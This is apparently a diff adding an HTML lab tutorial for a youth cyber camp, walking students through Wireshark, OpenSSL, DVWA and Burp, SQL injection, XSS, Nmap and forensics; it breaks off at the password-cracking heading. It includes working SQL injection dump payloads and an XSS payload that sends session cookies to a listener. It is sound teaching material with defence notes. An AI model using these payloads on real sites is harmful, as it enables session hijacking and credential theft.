@@ -1,0 +1,635 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Cyber Range Lab Tutorial - Cyber Squad 2026</title>
+<style>
+*{box-sizing:border-box}
+body{font-family:"Segoe UI",Arial,sans-serif;color:#16223a;max-width:960px;margin:24px auto;padding:0 20px;line-height:1.65}
+h1{font-size:28px;margin-bottom:4px}
+h2{font-size:21px;margin-top:40px;color:#1d4ed8;border-bottom:2px solid #bfdbfe;padding-bottom:5px}
+h3{font-size:16px;margin-top:22px;color:#1e3a5f;font-weight:700}
+h4{font-size:14px;margin-top:16px;color:#374151;font-weight:700;text-transform:uppercase;letter-spacing:.04em}
+.sub{color:#5b6b85;margin-top:0;font-size:15px}
+.env{background:#f0f4ff;border-left:4px solid #2563eb;border-radius:8px;padding:10px 16px;margin:14px 0}
+.env .day{font-size:12px;font-weight:700;color:#2563eb;text-transform:uppercase;letter-spacing:.06em}
+.step{display:flex;gap:12px;margin:10px 0;align-items:flex-start}
+.step .num{background:#1d4ed8;color:#fff;border-radius:50%;min-width:26px;height:26px;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:2px}
+.step .body{flex:1}
+.cmd{font-family:Consolas,ui-monospace,monospace;background:#0f172a;color:#e2e8f0;border-radius:7px;padding:9px 15px;margin:6px 0;font-size:14px;overflow-x:auto;display:block;white-space:pre}
+.out{font-family:Consolas,ui-monospace,monospace;background:#1e293b;color:#94a3b8;border-radius:7px;padding:7px 15px;margin:3px 0 9px;font-size:13px;overflow-x:auto;display:block;white-space:pre}
+.tip{background:#fffbeb;border:1px solid #fde68a;border-radius:8px;padding:9px 14px;margin:10px 0;font-size:14px}
+.warn{background:#fef2f2;border:1px solid #fca5a5;border-radius:8px;padding:9px 14px;margin:10px 0;font-size:14px}
+.note{background:#f0fdf4;border:1px solid #86efac;border-radius:8px;padding:9px 14px;margin:10px 0;font-size:14px}
+code{background:#eef2f7;border:1px solid #e2e8f0;border-radius:4px;padding:1px 6px;font-family:Consolas,monospace;font-size:13.5px}
+.pill{display:inline-block;border-radius:6px;padding:2px 10px;font-size:12px;font-weight:700;margin-left:6px;vertical-align:middle}
+.d3{background:#d1fae5;color:#065f46}.d4{background:#fef3c7;color:#92400e}.d5{background:#fce7f3;color:#9d174d}
+table{border-collapse:collapse;width:100%;margin:10px 0;font-size:14px}
+th{background:#1e3a5f;color:#fff;text-align:left;padding:8px 11px}
+td{border:1px solid #e2e8f0;padding:7px 11px}
+tr:nth-child(even){background:#f8fafc}
+a{color:#2563eb}
+.toc a{display:block;padding:3px 0;color:#1d4ed8;text-decoration:none;font-size:14px}
+.toc a:hover{text-decoration:underline}
+hr{border:none;border-top:1px solid #e2e8f0;margin:28px 0}
+</style></head><body>
+
+<h1>Cyber Range Lab Tutorial</h1>
+<p class="sub">Detailed step-by-step guide for Days 3-5 — Cyber Squad 2026. Share this page with students at the start of each lab session.</p>
+
+<div class="warn"><b>Ethics reminder:</b> Every command in this guide runs inside the isolated U.S. Cyber Range environment. The practice targets are virtual machines provided by your instructor. Attacking real systems, real websites, or the camp Wi-Fi without authorization violates the Computer Fraud and Abuse Act (CFAA) and is a federal crime.</div>
+
+<!-- TABLE OF CONTENTS -->
+<div class="env" style="margin-top:20px">
+<div class="day">Contents</div>
+<div class="toc" style="column-count:2;column-gap:24px;margin-top:6px">
+<a href="#login">Logging into the Cyber Range</a>
+<a href="#d3-wireshark">Day 3: Opening Wireshark</a>
+<a href="#d3-capture">Day 3: Capturing packets</a>
+<a href="#d3-filters">Day 3: Display filters</a>
+<a href="#d3-follow">Day 3: Following TCP streams</a>
+<a href="#d3-tls">Day 3: Inspecting TLS certificates</a>
+<a href="#d3-openssl">Day 3: OpenSSL encrypt and decrypt</a>
+<a href="#d3-ciphers">Day 3: Terminal cipher tools</a>
+<a href="#d4-dvwa">Day 4: Setting up DVWA</a>
+<a href="#d4-burp">Day 4: Opening Burp Suite</a>
+<a href="#d4-proxy">Day 4: Configuring the browser proxy</a>
+<a href="#d4-intercept">Day 4: Intercepting requests</a>
+<a href="#d4-sqli">Day 4: SQL injection lab</a>
+<a href="#d4-xss">Day 4: Cross-site scripting lab</a>
+<a href="#d4-cookie">Day 4: Cookie stealing demo</a>
+<a href="#d5-recon">Day 5: Reconnaissance with Nmap</a>
+<a href="#d5-web">Day 5: Web enumeration</a>
+<a href="#d5-forensics">Day 5: File forensics</a>
+<a href="#d5-passwords">Day 5: Password cracking</a>
+<a href="#d5-stego">Day 5: Steganography</a>
+<a href="#d5-logs">Day 5: Log analysis</a>
+<a href="#d5-ctf">Day 5: CTF workflow</a>
+<a href="#quickref">Quick-reference cheat sheet</a>
+</div>
+</div>
+
+<!-- ──────────────────────────── LOGGING IN ─────────────────────────────── -->
+<h2 id="login">Logging into the U.S. Cyber Range</h2>
+<div class="env"><div class="day">All days</div></div>
+
+<div class="step"><div class="num">1</div><div class="body">Open a browser and go to <a href="https://www.uscyberrange.org" target="_blank" rel="noopener">uscyberrange.org</a> and click <b>Log In</b>.</div></div>
+<div class="step"><div class="num">2</div><div class="body">Enter your instructor-provided username and password, then click <b>Sign In</b>.</div></div>
+<div class="step"><div class="num">3</div><div class="body">In your dashboard, click <b>Courseware Repository</b>, search for the instructor's course, and click <b>Enroll</b>. Then click the lab link your instructor posts in the session chat.</div></div>
+<div class="step"><div class="num">4</div><div class="body">The virtual machine desktop appears in your browser (allow 30-60 seconds). You are now inside an isolated environment — all commands stay there.</div></div>
+<div class="tip"><b>Tip:</b> If the screen freezes, click <b>Restart</b> in the range toolbar. Persistent drive data is saved; only running processes restart.</div>
+
+<hr>
+
+<!-- ══════════════════════════════════════════════════════════════════════
+     DAY 3 — CRYPTOGRAPHY AND WIRESHARK
+══════════════════════════════════════════════════════════════════════ -->
+<h2>Day 3: Cryptography and Network Packet Analysis <span class="pill d3">Day 3</span></h2>
+<div class="env"><div class="day">Environment: K12 Cyber Security Concepts — Kali Linux 2025.7</div>Full Kali Linux desktop. Today you inspect live network traffic with Wireshark, decode ciphers in the terminal, and practice TLS certificate inspection and symmetric encryption with OpenSSL.</div>
+
+<!-- OPENING WIRESHARK -->
+<h3 id="d3-wireshark">Part A: Opening Wireshark</h3>
+
+<div class="step"><div class="num">1</div><div class="body">Click <b>Applications</b> in the top-left corner of the Kali desktop, go to <b>Sniffing and Spoofing</b>, and click <b>Wireshark</b>.<br>
+<i>Alternative — open a terminal and type:</i>
+<span class="cmd">sudo wireshark &amp;</span>
+The <code>&amp;</code> runs it in the background so the terminal stays usable. Press Enter if prompted to confirm running as root.</div></div>
+
+<div class="step"><div class="num">2</div><div class="body">The Wireshark welcome screen shows a list of network interfaces. Each one shows a live sparkline if traffic is flowing. Select <b>eth0</b> (or whichever your instructor specifies). Double-click it to begin capturing.</div></div>
+
+<div class="step"><div class="num">3</div><div class="body">You will see rows scrolling by. Each row is one packet. The columns are: No. (sequence), Time (seconds since start), Source IP, Destination IP, Protocol, Length, and Info summary.</div></div>
+
+<!-- CAPTURING PACKETS -->
+<h3 id="d3-capture">Part B: Capturing packets and saving a trace</h3>
+
+<div class="step"><div class="num">1</div><div class="body">While Wireshark is running, open Firefox and browse to any HTTP site your instructor provides (e.g., <code>http://neverssl.com</code>). Watch the packets appear in Wireshark.</div></div>
+
+<div class="step"><div class="num">2</div><div class="body">Click the red square <b>Stop</b> button (or press Ctrl+E) to pause the capture. You now have a frozen snapshot to analyze.</div></div>
+
+<div class="step"><div class="num">3</div><div class="body">Save the capture for later: <b>File → Save As</b>, name it <code>day3_capture.pcap</code>, choose your home directory, and click <b>Save</b>.</div></div>
+
+<div class="step"><div class="num">4</div><div class="body">Reload the saved file from the terminal:
+<span class="cmd">wireshark ~/day3_capture.pcap &amp;</span></div></div>
+
+<div class="tip"><b>What is a PCAP file?</b> A packet capture. It stores a byte-for-byte recording of every frame that crossed the interface. SOC analysts collect PCAPs during incidents and replay them later to reconstruct exactly what happened.</div>
+
+<!-- DISPLAY FILTERS -->
+<h3 id="d3-filters">Part C: Display filters</h3>
+<p>Type filters into the green bar directly below the toolbar and press Enter.</p>
+
+<table>
+<tr><th>Filter</th><th>What it shows</th><th>Why useful</th></tr>
+<tr><td><code>http</code></td><td>Unencrypted web requests and responses</td><td>Find login forms, cookies, and data in transit</td></tr>
+<tr><td><code>dns</code></td><td>Domain name lookups</td><td>See which hostnames a device is contacting</td></tr>
+<tr><td><code>tcp.port == 443</code></td><td>HTTPS traffic on port 443</td><td>Volume analysis even without decryption</td></tr>
+<tr><td><code>tcp.port == 22</code></td><td>SSH connections</td><td>Remote access — encrypted, but metadata visible</td></tr>
+<tr><td><code>ip.addr == 10.0.0.5</code></td><td>All packets to or from one IP</td><td>Isolate a specific host</td></tr>
+<tr><td><code>http.request.method == "POST"</code></td><td>Form submissions</td><td>Find credentials sent in plaintext over HTTP</td></tr>
+<tr><td><code>tcp contains "password"</code></td><td>Packets whose payload contains the word</td><td>Keyword hunting in cleartext traffic</td></tr>
+<tr><td><code>!(arp or icmp or dns)</code></td><td>Everything except noise protocols</td><td>Cut through broadcast clutter</td></tr>
+</table>
+
+<div class="step"><div class="num">1</div><div class="body">Apply the filter <code>http</code>. Click on any GET request row. The middle pane shows the protocol stack: Ethernet II → Internet Protocol → Transmission Control Protocol → Hypertext Transfer Protocol. Click the arrows to expand each layer.</div></div>
+
+<div class="step"><div class="num">2</div><div class="body">Apply <code>http.request.method == "POST"</code>. If you browsed to a page with a login form and submitted it over plain HTTP, you will see the username and password in the Info column or in the packet detail pane — this is why HTTPS is required for any real login.</div></div>
+
+<!-- FOLLOW STREAM -->
+<h3 id="d3-follow">Part D: Following a TCP stream</h3>
+
+<div class="step"><div class="num">1</div><div class="body">Right-click any HTTP packet → <b>Follow</b> → <b>TCP Stream</b>. A dialog opens showing the complete conversation: the client request is in red, the server response is in blue.</div></div>
+
+<div class="step"><div class="num">2</div><div class="body">In the dialog, use <b>Show data as</b> → <b>ASCII</b> to read the raw HTTP headers and body. You can see cookies, User-Agent strings, and any form data the browser sent.</div></div>
+
+<div class="step"><div class="num">3</div><div class="body">Export the stream: click <b>Save as</b> → name it <code>stream1.txt</code>. Then search it:
+<span class="cmd">grep -i "cookie\|set-cookie\|password\|token" ~/stream1.txt</span></div></div>
+
+<div class="step"><div class="num">4</div><div class="body">Close the stream dialog. Now try <b>Follow → UDP Stream</b> on a DNS packet to see the raw DNS query and answer in text.</div></div>
+
+<!-- TLS CERTS -->
+<h3 id="d3-tls">Part E: Inspecting TLS certificates from the terminal</h3>
+
+<div class="step"><div class="num">1</div><div class="body">Connect to a live site and read its certificate:
+<span class="cmd">echo | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -noout -text | head -40</span>
+<span class="out">Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number: ...
+        Signature Algorithm: sha256WithRSAEncryption
+        Issuer: C=US, O=Google Trust Services, CN=WR2
+        Validity
+            Not Before: May 21 08:12:01 2025 GMT
+            Not After : Aug 13 08:12:00 2025 GMT
+        Subject: CN=*.google.com
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                Public-Key: (2048 bit)</span></div></div>
+
+<div class="step"><div class="num">2</div><div class="body">Show just the key fields — subject, issuer, validity dates:
+<span class="cmd">echo | openssl s_client -connect bsu.edu:443 2>/dev/null \
+  | openssl x509 -noout -subject -issuer -dates</span></div></div>
+
+<div class="step"><div class="num">3</div><div class="body">Show the full certificate chain to see the intermediate and root CA:
+<span class="cmd">echo | openssl s_client -connect bsu.edu:443 -showcerts 2>/dev/null | grep "subject\|issuer"</span></div></div>
+
+<div class="step"><div class="num">4</div><div class="body">Check when a certificate expires (useful for monitoring):
+<span class="cmd">echo | openssl s_client -connect bsu.edu:443 2>/dev/null \
+  | openssl x509 -noout -enddate</span>
+<span class="out">notAfter=Nov  7 23:59:59 2025 GMT</span></div></div>
+
+<!-- OPENSSL ENCRYPT/DECRYPT -->
+<h3 id="d3-openssl">Part F: Symmetric encryption with OpenSSL</h3>
+
+<div class="step"><div class="num">1</div><div class="body">Create a plaintext file:
+<span class="cmd">echo "TOP SECRET: meet at noon" > secret.txt</span></div></div>
+
+<div class="step"><div class="num">2</div><div class="body">Encrypt it with AES-256-CBC. You will be prompted to create a passphrase:
+<span class="cmd">openssl enc -aes-256-cbc -pbkdf2 -in secret.txt -out secret.enc</span>
+The file <code>secret.enc</code> is binary ciphertext — try opening it and you will see garbage.</div></div>
+
+<div class="step"><div class="num">3</div><div class="body">Decrypt it (you will need the same passphrase):
+<span class="cmd">openssl enc -d -aes-256-cbc -pbkdf2 -in secret.enc -out recovered.txt
+cat recovered.txt</span>
+<span class="out">TOP SECRET: meet at noon</span></div></div>
+
+<div class="step"><div class="num">4</div><div class="body">Try decrypting with the wrong passphrase to see what happens:
+<span class="cmd">openssl enc -d -aes-256-cbc -pbkdf2 -in secret.enc -out wrong.txt -pass pass:wrongpass
+cat wrong.txt</span>
+You get a decryption error or gibberish — the wrong key cannot recover the plaintext.</div></div>
+
+<div class="step"><div class="num">5</div><div class="body">Generate an RSA key pair for asymmetric encryption:
+<span class="cmd">openssl genrsa -out private.pem 2048
+openssl rsa -in private.pem -pubout -out public.pem</span></div></div>
+
+<div class="step"><div class="num">6</div><div class="body">Encrypt a small message with the public key (RSA can only encrypt short data):
+<span class="cmd">echo "hello" | openssl pkeyutl -encrypt -pubin -inkey public.pem -out msg.enc
+openssl pkeyutl -decrypt -inkey private.pem -in msg.enc</span>
+<span class="out">hello</span></div></div>
+
+<!-- CIPHER TOOLS -->
+<h3 id="d3-ciphers">Part G: Cipher tools in the terminal</h3>
+
+<div class="step"><div class="num">1</div><div class="body">Brute-force all 25 Caesar shifts on a ciphertext:
+<span class="cmd">python3 -c "
+txt='KHOOR, ZRUOG!'
+for s in range(1,26):
+    d=''.join(chr((ord(c)-65-s)%26+65) if c.isalpha() else c for c in txt.upper())
+    print(f'shift {s:2d}: {d}')
+"</span>
+<span class="out">shift  1: JGNNQ, YQTNF!
+...
+shift  3: HELLO, WORLD!
+...</span></div></div>
+
+<div class="step"><div class="num">2</div><div class="body">Frequency analysis on a ciphertext — count letter occurrences:
+<span class="cmd">echo "KHOOR ZRUOG KHOOR NKDH" | tr '[:upper:]' '[:lower:]' \
+  | grep -o '[a-z]' | sort | uniq -c | sort -rn</span>
+<span class="out">      4 o
+      3 k
+      2 r
+...</span></div></div>
+
+<div class="step"><div class="num">3</div><div class="body">Hash a string from the command line:
+<span class="cmd">echo -n "sunshine" | sha256sum
+echo -n "sunshine" | md5sum</span>
+<span class="out">c0067d4af4e87f00dbac87c9f9f7b5ad6c69b01e07e39e1ecbb2e25e80c6a65b  -
+1f87d666a8b8c5a9eb22b8addf9c2a00  -</span></div></div>
+
+<div class="step"><div class="num">4</div><div class="body">Decode Base64 strings:
+<span class="cmd">echo "SGVsbG8sIFdvcmxkIQ==" | base64 --decode</span>
+<span class="out">Hello, World!</span></div></div>
+
+<div class="step"><div class="num">5</div><div class="body">Encode a message in Base64 (to see it is not encryption):
+<span class="cmd">echo "attack at dawn" | base64</span>
+<span class="out">YXR0YWNrIGF0IGRhd24K</span></div></div>
+
+<hr>
+
+<!-- ══════════════════════════════════════════════════════════════════════
+     DAY 4 — WEB SECURITY
+══════════════════════════════════════════════════════════════════════ -->
+<h2>Day 4: Web Application Security — SQLi, XSS, Burp Suite <span class="pill d4">Day 4</span></h2>
+<div class="env"><div class="day">Environment: K12 Cyber Security Concepts — Kali Linux 2025.7</div>Kali Linux with Burp Suite Community Edition and DVWA (Damn Vulnerable Web App) already installed. All attacks run against the local DVWA instance — do not target any external site.</div>
+
+<!-- DVWA SETUP -->
+<h3 id="d4-dvwa">Part A: Starting DVWA (the practice target)</h3>
+
+<div class="step"><div class="num">1</div><div class="body">Open a terminal and start the web server and database:
+<span class="cmd">sudo service apache2 start
+sudo service mysql start</span>
+<span class="out">* Starting Apache httpd web server apache2    [ OK ]
+ * Starting MySQL database server mysqld       [ OK ]</span></div></div>
+
+<div class="step"><div class="num">2</div><div class="body">Open Firefox and go to <code>http://localhost/dvwa</code>. Log in with <code>admin / password</code>.</div></div>
+
+<div class="step"><div class="num">3</div><div class="body">Click <b>DVWA Security</b> in the left menu. Set the security level to <b>Low</b> and click <b>Submit</b>. Low security means the validation is intentionally broken — that is what you will exploit.</div></div>
+
+<div class="step"><div class="num">4</div><div class="body">If this is your first time, click <b>Setup / Reset DB</b> at the bottom of the left menu, then click <b>Create / Reset Database</b>. The page reloads and you may need to log in again.</div></div>
+
+<!-- BURP SUITE -->
+<h3 id="d4-burp">Part B: Opening Burp Suite</h3>
+
+<div class="step"><div class="num">1</div><div class="body">Open a terminal and launch Burp Suite:
+<span class="cmd">burpsuite &amp;</span>
+Or go to <b>Applications → Web Application Analysis → burpsuite</b>.</div></div>
+
+<div class="step"><div class="num">2</div><div class="body">When the startup dialog appears, choose <b>Temporary project</b> → click <b>Next</b> → choose <b>Use Burp defaults</b> → click <b>Start Burp</b>. The main dashboard loads.</div></div>
+
+<div class="step"><div class="num">3</div><div class="body">Click the <b>Proxy</b> tab at the top. Confirm the sub-tab says <b>Intercept is off</b> for now (we will turn it on in Part D).</div></div>
+
+<!-- BROWSER PROXY -->
+<h3 id="d4-proxy">Part C: Configuring Firefox to route through Burp</h3>
+
+<div class="step"><div class="num">1</div><div class="body">In Firefox, click the three-bar menu (top right) → <b>Settings</b> → scroll down to <b>Network Settings</b> → click <b>Settings...</b></div></div>
+
+<div class="step"><div class="num">2</div><div class="body">Select <b>Manual proxy configuration</b>. Fill in:
+<ul style="margin:6px 0">
+<li>HTTP Proxy: <code>127.0.0.1</code> Port: <code>8080</code></li>
+<li>Check the box: <b>Also use this proxy for HTTPS</b></li>
+</ul>
+Click <b>OK</b>.</div></div>
+
+<div class="step"><div class="num">3</div><div class="body">Install Burp's CA certificate so Firefox can intercept HTTPS without errors. In Firefox, navigate to <code>http://burpsuite</code>. Click <b>CA Certificate</b> to download <code>cacert.der</code>.</div></div>
+
+<div class="step"><div class="num">4</div><div class="body">Go to Firefox Settings → search "certificates" → click <b>View Certificates</b> → <b>Authorities</b> tab → <b>Import</b>. Select the downloaded <code>cacert.der</code> file. Check both trust boxes and click <b>OK</b>.</div></div>
+
+<div class="step"><div class="num">5</div><div class="body">Test the setup: browse to <code>http://localhost/dvwa</code> in Firefox. Go to Burp → <b>Proxy → HTTP history</b> tab. You should see the DVWA requests appearing there even with Intercept off — Burp is silently logging everything.</div></div>
+
+<!-- INTERCEPTING -->
+<h3 id="d4-intercept">Part D: Intercepting and modifying a request</h3>
+
+<div class="step"><div class="num">1</div><div class="body">In Burp → <b>Proxy</b> tab → click <b>Intercept is off</b> to toggle it to <b>Intercept is on</b>.</div></div>
+
+<div class="step"><div class="num">2</div><div class="body">In Firefox, go to <code>http://localhost/dvwa/vulnerabilities/sqli/</code>. Type <code>1</code> into the User ID field and click Submit. Firefox will appear to hang — the request is paused inside Burp.</div></div>
+
+<div class="step"><div class="num">3</div><div class="body">Look at the Burp Intercept tab. You see the raw HTTP request:
+<span class="out">GET /dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit HTTP/1.1
+Host: localhost
+Cookie: security=low; PHPSESSID=abc123</span></div></div>
+
+<div class="step"><div class="num">4</div><div class="body">Right-click anywhere in the request text and choose <b>Send to Repeater</b>. Then click <b>Forward</b> to let the original request through. Turn Intercept off.</div></div>
+
+<div class="step"><div class="num">5</div><div class="body">Click the <b>Repeater</b> tab. The request is here now. Change the <code>id=1</code> parameter to different values and click <b>Send</b> each time. Inspect the <b>Response</b> panel on the right — you control the request without using the browser at all.</div></div>
+
+<!-- SQL INJECTION -->
+<h3 id="d4-sqli">Part E: SQL injection</h3>
+
+<div class="step"><div class="num">1</div><div class="body">In Firefox, go to <code>http://localhost/dvwa/vulnerabilities/sqli/</code>. In the User ID box, type a single quote:
+<span class="cmd">'</span>
+Click Submit. You should see a MySQL error:
+<span class="out">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version...</span>
+This confirms the field is inserting your input directly into a SQL query without sanitizing it.</div></div>
+
+<div class="step"><div class="num">2</div><div class="body">Understand what is happening. The app's query looks like:
+<span class="cmd">SELECT first_name, last_name FROM users WHERE user_id = '$id';</span>
+When you type <code>'</code>, the query becomes:
+<span class="cmd">SELECT first_name, last_name FROM users WHERE user_id = ''';</span>
+The unmatched quote breaks the SQL syntax — that is the error you saw.</div></div>
+
+<div class="step"><div class="num">3</div><div class="body">Always-true injection — log in without knowing a valid ID:
+<span class="cmd">1' OR '1'='1</span>
+The query becomes:
+<span class="cmd">SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';</span>
+The <code>OR '1'='1'</code> is always true, so every row in the users table is returned.</div></div>
+
+<div class="step"><div class="num">4</div><div class="body">Union injection to read column names from the database schema:
+<span class="cmd">1' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_name='users'-- -</span>
+<span class="out">ID: 1' UNION ...
+First name: users
+Surname: user_id
+
+First name: users
+Surname: first_name
+
+First name: users
+Surname: password</span></div></div>
+
+<div class="step"><div class="num">5</div><div class="body">Dump all usernames and hashed passwords:
+<span class="cmd">1' UNION SELECT user,password FROM users-- -</span>
+<span class="out">First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03</span>
+Copy one of those MD5 hashes and paste it into <a href="https://crackstation.net" target="_blank" rel="noopener">crackstation.net</a> — it cracks in seconds because they are unsalted MD5.</div></div>
+
+<div class="note"><b>Defense:</b> All of the above is prevented by <b>parameterized queries</b> (also called prepared statements). The code separates the query structure from the user data so it is impossible for a quote to break the SQL syntax.</div>
+
+<!-- XSS -->
+<h3 id="d4-xss">Part F: Cross-site scripting (XSS)</h3>
+
+<div class="step"><div class="num">1</div><div class="body">Go to <code>http://localhost/dvwa/vulnerabilities/xss_r/</code>. Type your name and click Submit. The page echoes it back: "Hello, [name]!" The app is reflecting your input directly into the HTML.</div></div>
+
+<div class="step"><div class="num">2</div><div class="body">Inject a script tag instead of a name:
+<span class="cmd">&lt;script&gt;alert('XSS works!')&lt;/script&gt;</span>
+A JavaScript alert dialog pops up. You just ran code in the victim's browser.</div></div>
+
+<div class="step"><div class="num">3</div><div class="body">Inject HTML to deface the page:
+<span class="cmd">&lt;h1 style="color:red"&gt;HACKED&lt;/h1&gt;</span>
+The page layout changes to show your injected heading.</div></div>
+
+<div class="step"><div class="num">4</div><div class="body">More dangerous — read cookies (this shows why HttpOnly matters):
+<span class="cmd">&lt;script&gt;alert('Cookie: ' + document.cookie)&lt;/script&gt;</span>
+The alert shows the session cookie. A real attacker would send this to their own server instead of an alert.</div></div>
+
+<!-- COOKIE STEALING -->
+<h3 id="d4-cookie">Part G: Cookie stealing demonstration</h3>
+
+<div class="step"><div class="num">1</div><div class="body">In your terminal, start a simple HTTP listener to catch incoming "stolen" cookies:
+<span class="cmd">python3 -m http.server 9999</span>
+Leave this terminal running.</div></div>
+
+<div class="step"><div class="num">2</div><div class="body">In DVWA Reflected XSS, inject a payload that sends the cookie to your listener:
+<span class="cmd">&lt;script&gt;new Image().src='http://127.0.0.1:9999/?c='+document.cookie&lt;/script&gt;</span></div></div>
+
+<div class="step"><div class="num">3</div><div class="body">Switch back to the terminal window running the Python server. You will see the request arrive:
+<span class="out">127.0.0.1 - - [23/Jun/2026 10:14:02] "GET /?c=security=low;%20PHPSESSID=abc123 HTTP/1.1" 200 -</span>
+The session cookie has been exfiltrated — a real attacker would use this to hijack the session.</div></div>
+
+<div class="step"><div class="num">4</div><div class="body">Stop the listener with Ctrl+C.</div></div>
+
+<div class="note"><b>Defenses:</b> (1) Output encoding — encode <code>&lt;</code> and <code>&gt;</code> before inserting user data into HTML. (2) <code>HttpOnly</code> cookie flag — prevents JavaScript from reading <code>document.cookie</code>. (3) Content Security Policy (CSP) — blocks inline scripts entirely.</div>
+
+<hr>
+
+<!-- ══════════════════════════════════════════════════════════════════════
+     DAY 5 — CTF
+══════════════════════════════════════════════════════════════════════ -->
+<h2>Day 5: CTF, Forensics, and Blue-Team Analysis <span class="pill d5">Day 5</span></h2>
+<div class="env"><div class="day">Environment: K12 Cyber Security Concepts — Kali Linux 2025.7</div>Kali Linux with the full CTF toolkit. Your instructor loads the mini-CTF targets before the session. Flags are in the format <code>FLAG{...}</code>.</div>
+
+<!-- RECON / NMAP -->
+<h3 id="d5-recon">Part A: Network reconnaissance with Nmap</h3>
+
+<div class="step"><div class="num">1</div><div class="body">Get your own IP and subnet:
+<span class="cmd">ip addr show eth0 | grep "inet "</span>
+<span class="out">    inet 10.0.0.50/24 brd 10.0.0.255 scope global eth0</span>
+Your IP is <code>10.0.0.50</code> and the /24 means all IPs from <code>10.0.0.1</code> to <code>10.0.0.254</code> are in your subnet.</div></div>
+
+<div class="step"><div class="num">2</div><div class="body">Discover all live hosts on the subnet:
+<span class="cmd">nmap -sn 10.0.0.0/24</span>
+<span class="out">Nmap scan report for 10.0.0.10
+Host is up (0.0012s latency).
+Nmap scan report for 10.0.0.20
+Host is up (0.0019s latency).</span>
+<code>-sn</code> is a ping sweep — no port scanning yet, just finds who is online.</div></div>
+
+<div class="step"><div class="num">3</div><div class="body">Full scan of the target your instructor gives you — service versions and default scripts:
+<span class="cmd">nmap -sV -sC -oN scan.txt 10.0.0.10</span>
+<span class="out">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
+80/tcp   open  http    Apache httpd 2.4.52
+3306/tcp open  mysql   MySQL 8.0.32</span>
+<code>-sV</code> probes service versions. <code>-sC</code> runs default NSE scripts. <code>-oN</code> saves output to a file.</div></div>
+
+<div class="step"><div class="num">4</div><div class="body">Scan all 65535 ports (slower but more thorough):
+<span class="cmd">nmap -p- --min-rate 5000 -oN fullscan.txt 10.0.0.10</span>
+The <code>--min-rate 5000</code> sends at least 5000 packets per second — fast enough for a CTF range.</div></div>
+
+<div class="step"><div class="num">5</div><div class="body">Banner grab on a specific port to identify a service:
+<span class="cmd">nc 10.0.0.10 80
+HEAD / HTTP/1.0
+
+</span>
+(Press Enter twice after the blank line.) The server sends back its HTTP headers including the <code>Server:</code> version string.</div></div>
+
+<!-- WEB ENUMERATION -->
+<h3 id="d5-web">Part B: Web enumeration and source inspection</h3>
+
+<div class="step"><div class="num">1</div><div class="body">Brute-force hidden directories and files on the web target:
+<span class="cmd">gobuster dir -u http://10.0.0.10 -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt</span>
+<span class="out">/admin                (Status: 200) [Size: 1234]
+/backup               (Status: 403) [Size: 289]
+/robots.txt           (Status: 200) [Size: 56]</span>
+Always check <code>/robots.txt</code> — it often lists paths the site owner does NOT want indexed, which can be exactly what you are looking for.</div></div>
+
+<div class="step"><div class="num">2</div><div class="body">Read robots.txt from the terminal:
+<span class="cmd">curl -s http://10.0.0.10/robots.txt</span>
+<span class="out">User-agent: *
+Disallow: /secret/
+Disallow: /flag.txt</span></div></div>
+
+<div class="step"><div class="num">3</div><div class="body">Download and search the page source for hidden flags or comments:
+<span class="cmd">curl -s http://10.0.0.10/admin/ | grep -i "flag\|FLAG\|&lt;!--\|hidden\|secret"</span></div></div>
+
+<div class="step"><div class="num">4</div><div class="body">Download all linked files for offline analysis:
+<span class="cmd">wget -r -l 1 --no-parent http://10.0.0.10/admin/ -P ./site_dump/</span></div></div>
+
+<div class="step"><div class="num">5</div><div class="body">Look for flags in JavaScript files — they are often left in comments:
+<span class="cmd">curl -s http://10.0.0.10/admin/app.js | grep -i "flag\|key\|secret\|pass"</span></div></div>
+
+<!-- FORENSICS -->
+<h3 id="d5-forensics">Part C: File forensics</h3>
+
+<div class="step"><div class="num">1</div><div class="body">Identify any file regardless of its extension — never trust a filename:
+<span class="cmd">file mystery.bin</span>
+<span class="out">mystery.bin: PNG image data, 640 x 480, 8-bit/color RGB, non-interlaced</span></div></div>
+
+<div class="step"><div class="num">2</div><div class="body">Extract all printable ASCII strings (minimum 6 chars) and search for a flag:
+<span class="cmd">strings -n 6 mystery.bin | grep -i "flag\|FLAG\|CTF"</span></div></div>
+
+<div class="step"><div class="num">3</div><div class="body">Look at the hex dump — the first few bytes (magic bytes) identify the file format:
+<span class="cmd">xxd mystery.bin | head -4</span>
+<span class="out">00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR</span>
+<code>89 50 4e 47</code> is the PNG magic number. A file claiming to be a JPEG but starting with these bytes is actually a PNG — or something else is hidden inside it.</div></div>
+
+<div class="step"><div class="num">4</div><div class="body">Scan for embedded files inside an image or binary:
+<span class="cmd">binwalk mystery.bin</span>
+<span class="out">DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 640 x 480
+12345         0x3039          Zip archive data, at least v2.0</span></div></div>
+
+<div class="step"><div class="num">5</div><div class="body">Extract all embedded files found by binwalk:
+<span class="cmd">binwalk -e mystery.bin</span>
+A folder named <code>_mystery.bin.extracted/</code> appears containing all embedded files. List them:
+<span class="cmd">ls _mystery.bin.extracted/
+cat _mystery.bin.extracted/flag.txt</span></div></div>
+
+<div class="step"><div class="num">6</div><div class="body">Read EXIF metadata from an image (coordinates, device, creation date):
+<span class="cmd">exiftool mystery.bin</span>
+<span class="out">File Type                       : PNG
+Image Width                     : 640
+Image Height                    : 480
+Comment                         : FLAG{metadata_hiding}</span>
+Flags are sometimes stored as EXIF comments.</div></div>
+
+<!-- PASSWORD CRACKING -->
+<h3 id="d5-passwords">Part D: Password cracking</h3>
+
